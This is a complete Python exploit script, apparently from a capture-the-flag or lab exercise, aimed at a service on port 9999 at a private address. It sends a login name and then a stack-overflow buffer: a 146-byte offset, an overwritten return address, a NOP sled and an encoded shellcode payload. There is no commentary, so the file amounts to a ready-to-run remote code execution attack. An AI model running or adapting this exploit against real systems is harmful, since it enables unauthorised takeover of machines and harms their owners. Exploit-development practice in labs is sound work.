import socket
import time
ip = "10.10.162.137"
port = 9999

#0x625014df
prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16

payload = ("\xbf\xc0\xa6\x35\x7d\xdb\xc1\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x7a\x12\x83\xc2\x04\x03\xba\xa8\xd7\x88\xc6\x5d\x95"
"\x73\x36\x9e\xfa\xfa\xd3\xaf\x3a\x98\x90\x80\x8a\xea\xf4\x2c"
"\x60\xbe\xec\xa7\x04\x17\x03\x0f\xa2\x41\x2a\x90\x9f\xb2\x2d"
"\x12\xe2\xe6\x8d\x2b\x2d\xfb\xcc\x6c\x50\xf6\x9c\x25\x1e\xa5"
"\x30\x41\x6a\x76\xbb\x19\x7a\xfe\x58\xe9\x7d\x2f\xcf\x61\x24"
"\xef\xee\xa6\x5c\xa6\xe8\xab\x59\x70\x83\x18\x15\x83\x45\x51"
"\xd6\x28\xa8\x5d\x25\x30\xed\x5a\xd6\x47\x07\x99\x6b\x50\xdc"
"\xe3\xb7\xd5\xc6\x44\x33\x4d\x22\x74\x90\x08\xa1\x7a\x5d\x5e"
"\xed\x9e\x60\xb3\x86\x9b\xe9\x32\x48\x2a\xa9\x10\x4c\x76\x69"
"\x38\xd5\xd2\xdc\x45\x05\xbd\x81\xe3\x4e\x50\xd5\x99\x0d\x3d"
"\x1a\x90\xad\xbd\x34\xa3\xde\x8f\x9b\x1f\x48\xbc\x54\x86\x8f"
"\xc3\x4e\x7e\x1f\x3a\x71\x7f\x36\xf9\x25\x2f\x20\x28\x46\xa4"
"\xb0\xd5\x93\x6b\xe0\x79\x4c\xcc\x50\x3a\x3c\xa4\xba\xb5\x63"
"\xd4\xc5\x1f\x0c\x7f\x3c\xc8\x39\x89\x3e\xc4\x56\x8b\x3e\xc5"
"\xfa\x02\xd8\x8f\x12\x43\x73\x38\x8a\xce\x0f\xd9\x53\xc5\x6a"
"\xd9\xd8\xea\x8b\x94\x28\x86\x9f\x41\xd9\xdd\xfd\xc4\xe6\xcb"
"\x69\x8a\x75\x90\x69\xc5\x65\x0f\x3e\x82\x58\x46\xaa\x3e\xc2"
"\xf0\xc8\xc2\x92\x3b\x48\x19\x67\xc5\x51\xec\xd3\xe1\x41\x28"
"\xdb\xad\x35\xe4\x8a\x7b\xe3\x42\x65\xca\x5d\x1d\xda\x84\x09"
"\xd8\x10\x17\x4f\xe5\x7c\xe1\xaf\x54\x29\xb4\xd0\x59\xbd\x30"
"\xa9\x87\x5d\xbe\x60\x0c\x7d\x5d\xa0\x79\x16\xf8\x21\xc0\x7b"
"\xfb\x9c\x07\x82\x78\x14\xf8\x71\x60\x5d\xfd\x3e\x26\x8e\x8f"
"\x2f\xc3\xb0\x3c\x4f\xc6")


postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes("timm" + "\r\n", "latin-1"))
  time.sleep(3)
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")